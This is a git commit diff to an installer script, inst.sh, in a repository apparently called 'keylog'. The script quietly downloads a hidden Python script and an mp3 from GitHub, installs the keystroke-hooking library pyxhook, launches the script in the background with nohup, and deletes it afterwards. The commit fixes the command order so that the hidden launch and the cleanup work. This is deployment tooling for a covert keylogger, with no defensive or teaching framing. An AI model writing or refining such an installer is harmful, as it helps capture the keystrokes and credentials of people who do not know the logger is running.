213d652ce842a0040bbf5fc87e3c22aac7d29930
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-13 04:27:09 +0000

    Fix command execution order in inst.sh

--- inst.sh
+++ inst.sh
@@ -3,4 +3,5 @@
 wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py .log.py
 wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3 .music.mp3
 yes | pip3 install pyxhook pygame 
-nohup python3 .log.py & && rm .log.py
+nohup python3 .log.py &
+rm .log.py
